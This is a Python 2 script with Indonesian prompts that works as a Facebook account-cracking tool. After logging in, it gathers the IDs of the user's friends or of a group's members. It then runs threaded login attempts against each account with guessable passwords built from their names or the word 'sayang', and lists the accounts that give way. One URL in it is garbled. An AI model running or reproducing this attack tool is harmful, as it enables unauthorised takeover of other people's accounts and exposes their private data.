import os
import sys
import time
import json
import urllib
import requests
from multiprocessing.pool import ThreadPool

d = "\033[90;1m"
m = "\033[91;1m"
h = "\033[92;1m"
a = "\033[97;1m"


id = []


def login():
    print 
    print a+ " LOGIN FB"
    user = raw_input(a+" Masukkan Username: ")
    password = raw_input(a+" Masukkan Password: ")
    url = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+password+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    dev = url.content
    jsl = json.loads(dev)
    if "session_key" in dev:
        print 
        print h+" LoginSukses...."
        open("toket.txt", "w").write(jsl["access_token"])
        print 
        super()

    elif "www.facebook.com" in jsl["error_msg"]:
        print 
        print m+ " Akun Kena Cekpoint..."
        print
        sys.exit()

    else:
        print
        print m+ " Gagal Login.."
        
def super():
    global toket
    try:
        toket = open("toket.txt", "r").read()
    except IOError:
        print " Tidak ada token"
        os.system("rm -f toket.txt")
        login()
    pilih_super()
    
def pilih_super():
    peak = raw_input(h+" Input No: ")
    if peak == '':
        print m+'[!] Jangan kosong'
        pilih_super()
    else:
        if peak == '1':

            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                idg = raw_input(a+ " ID Grup: ")
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print " Nama Grup: " + asw["name"]

                except KeyError:
                    print m+' Grup tidak ditemukan'
                    raw_input(h+ " Kembali")
                    sys.exit()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                sys.exit()

    print "Jumlah ID: " + str(len(id))

    print

    def main(arg):
        user = arg
        try:
            a = requests.get('://graph.fhttpsacebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print h+" [OK] " + user + ' | ' + pass1
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print m+ " [CP] " + user + ' | ' + pass1
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print h+" [OK] " + user + ' | ' + pass2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print m+" [CP] " + user + ' | ' + pass2
                        else:
                            pass3 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print h+" [OK] " + user + ' | ' + pass3
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print m+" [CP] " + user + ' | ' + pass3
                                else:
                            
                                    pass4 = "sayang"
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print h+" [OK] " + user + ' | ' + pass4
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print m+" [CP] " + user + ' | ' + pass4
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 'selesai'
    sys.exit()

def main():
    login()

if __name__=="__main__":
    main()
